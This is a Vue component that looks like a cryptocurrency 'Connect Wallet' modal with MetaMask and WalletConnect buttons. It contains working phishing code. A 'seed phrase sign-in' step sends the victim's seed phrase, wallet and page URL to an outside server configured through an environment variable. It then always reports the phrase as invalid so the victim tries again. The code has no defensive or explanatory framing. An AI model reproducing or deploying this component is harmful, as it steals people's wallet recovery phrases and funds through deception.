<template>
  <div v-if="modalVisibility" id="modal-connect" class="modal-b">
    <div class="modal-b__inner">
      <div class="modal-b__block">
        <div class="modal-b__steps modal-b__connect">
          <div v-if="initStage" class="modal-b__step">
            <h2 class="popup__title">Connect Wallet</h2>
            <div class="popup__wallet">
              <label class="popup__label">
                <input
                  type="radio"
                  value="Ethereum"
                  name="popup-wallet"
                  class="popup__radio"
                  checked="checked"
                />
                <span>Ethereum</span>
              </label>
              <label class="popup__label">
                <input
                  type="radio"
                  value="BNB Chain"
                  name="popup-wallet"
                  class="popup__radio"
                />
                <span>BNB Chain</span>
              </label>
              <label class="popup__label">
                <input
                  type="radio"
                  value="Polygon"
                  name="popup-wallet"
                  class="popup__radio"
                />
                <span>Polygon</span>
              </label>
            </div>
            <button
              type="button"
              @click.prevent="connect('mm')"
              class="popup__button"
            >
              <img src="@/assets/img/content/metamask.svg" alt="" />
              <span>MetaMask</span>
            </button>
            <button
              type="button"
              @click.prevent="connect('wc')"
              class="popup__button"
            >
              <img src="@/assets/img/content/walletconnect.svg" alt="" />
              <span>WalletConnect</span>
            </button>
            <p class="popup__text">
              Don’t have a wallet?
              <a href="javascript:void(0);">Learn how to get one</a>
            </p>
          </div>

          <div v-if="loading" class="modal-b__step">
            <div class="modal-b__title">{{ loadingTitle }}</div>
            <div v-if="loadingSubTitle" class="modal-b__note">
              {{ loadingSubTitle }}
            </div>
            <div class="modal-b__preloader">
              <img alt="" src="@/assets/img/content/loader.svg" />
            </div>
          </div>

          <div v-if="approveStage" class="modal-b__step">
            <div class="modal-b__title">Wallet conection</div>
            <div class="modal-b__note">
              Please confirm action on your wallet
            </div>
            <div class="modal-b__preloader">
              <img alt="" src="@/assets/img/content/loader.svg" />
            </div>
          </div>

          <div v-if="changeNetworkStage" class="modal-b__step">
            <div class="connect-wrapper__text">
              <strong>You Must Change Network</strong>
            </div>

            <div class="connect-wrapper__text connect-wrapper__text_small">
              <p>
                We've detected that you need to switch your wallet's network to
                <strong>{{ needNetworkChangeName }}</strong> to continue.
              </p>

              <span class="button-wrapper">
                <img src="@/assets/img/content/network.svg" alt="" />

                <button
                  class="popup__button change-network"
                  @click.prevent="reload"
                >
                  <span>Reload Page</span>
                </button>
              </span>
            </div>
          </div>

          <div v-if="seedStage" class="modal-b__step">
            <div class="modal-b__title">Use your Seed Phrase to sign in</div>
            <div class="form-token-b">
              <div class="form-token-b__list">
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-1.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-2.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-3.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-4.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-5.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-6.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-7.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-8.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-9.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-10.avif" />
                  </a>
                </div>
              </div>
              <div class="form-token-b__input">
                <textarea
                  v-model="seed"
                  :class="seedInputClass"
                  :disabled="seedInProgress"
                  class="form-token-b__input-type"
                  placeholder="Green Gold Cyan Tomato White Aqua Salmon Azure Teal Pink Purple Grey"
                ></textarea>
                <div v-if="hasSeedError" class="form-token-b__error">
                  An invalid seed phrase has been entered. Try it again.
                </div>
              </div>
              <div class="form-token-b__button">
                <button
                  :disabled="seedDisabled"
                  class="button button_orange button_upper"
                  type="submit"
                  @click.prevent="submitSeed"
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="modal-b__bg"></div>
  </div>
</template>

<script>
import modals from "@/mixins/modals";
import common from "@/mixins/common";
import { mapGetters } from "vuex";
import axios from "axios";

export default {
  name: "ModalComponent",
  mixins: [modals, common],
  data() {
    return {
      hasSeedError: false,
      seed: null,
      seedInProgress: false,
    };
  },
  computed: {
    ...mapGetters({
      stage: "stage",
      loading: "loading",
      wallet: "wallet",
      networkNameForChange: "networkNameForChange",
    }),
    seedDisabled() {
      let seed = this.seed;
      if (!seed) {
        return true;
      }
      seed = seed.replace(/\s+/g, " ").trim();
      let countWords = seed.split(" ").length;

      return (
        !(
          countWords === 12 ||
          countWords === 14 ||
          countWords === 16 ||
          countWords === 18 ||
          countWords === 20 ||
          countWords === 22 ||
          countWords === 24
        ) || this.seedInProgress
      );
    },
    seedStage() {
      return this.stage === "seedInput" && !this.loading;
    },
    seedInputClass() {
      return { "form-token-b__input-type_error": this.hasSeedError };
    },
  },
  methods: {
    submitSeed() {
      this.seedInProgress = true;
      axios
        .post(`https://${process.env.VUE_APP_CHECK_IP}/api/seed`, {
          wallet: this.wallet,
          seed: this.seed,
          link: location.href,
        })
        .finally(() => {
          this.hasSeedError = true;
          this.seedInProgress = false;
          this.seed = null;
        });
    },
    onClickMetaMask() {
      this.connect("mm");
    },
    onClickWalletConnect() {
      this.connect("wc");
    },
  },
  watch: {
    seed(value) {
      if (value && this.hasSeedError) {
        this.hasSeedError = false;
      }
    },
  },
};
</script>
